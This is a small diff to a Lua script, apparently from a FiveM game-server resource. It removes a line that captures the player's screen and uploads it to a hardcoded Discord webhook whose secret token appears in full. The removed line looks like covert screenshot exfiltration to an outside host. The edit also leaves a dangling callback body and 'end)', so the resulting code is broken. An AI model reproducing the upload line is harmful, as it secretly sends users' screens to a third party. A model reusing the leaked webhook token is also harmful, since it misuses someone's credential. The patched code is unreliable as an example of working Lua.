@@ -14,7 +14,7 @@ end)
 
 
 function screen()
-     exports['screenshot-basic']:requestScreenshotUpload('https://discord.com/api/webhooks/781230868072628264/FBxTXyr0wh5XAHWMhmUpcAs5laGlAThebYC5JbPkEfkTVEl0OP3sUVgbP2opDo2zxmG5', 'files[]', function(data)
+   
     local resp = json.decode(data)
     end)
 end
